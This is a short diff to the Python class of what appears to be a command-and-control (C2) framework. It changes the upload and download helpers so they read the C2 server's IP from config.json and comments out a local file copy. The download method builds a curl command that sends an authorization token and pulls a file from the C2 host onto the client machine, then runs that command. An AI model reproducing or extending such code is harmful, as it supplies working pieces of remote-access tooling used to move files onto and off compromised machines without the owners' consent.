@@ -73,7 +73,7 @@ class butane:
 
         return {"pwd": pwd, "directory": directory}
     
-    def upload(self, path, ip=socket.gethostbyname(socket.gethostname())):
+    def upload(self, path, ip=json.loads(open("config.json", "r").read())["ip"]):
         """
         upload a file to be saved onto the c2's uploads folder
 
@@ -83,7 +83,7 @@ class butane:
 
         return self.run(command)
     
-    def download(self, path, ip=socket.gethostbyname(socket.gethostname()), savepath="./"):
+    def download(self, path, ip=json.loads(open("config.json", "r").read())["ip"], savepath="./"):
         """
         download a file from the c2's uploads folder to the client's machine
 
@@ -91,6 +91,6 @@ class butane:
         """
         command = "curl -H \"Authorization: {}\" \"http://{}:{}/\" -o {}".format(self.uid, ip, self.port-4, os.path.join(savepath, os.path.basename(path)))
 
-        shutil.copy(path, "./uploads")
+        #shutil.copy(path, "./uploads")
 
         return self.run(command)
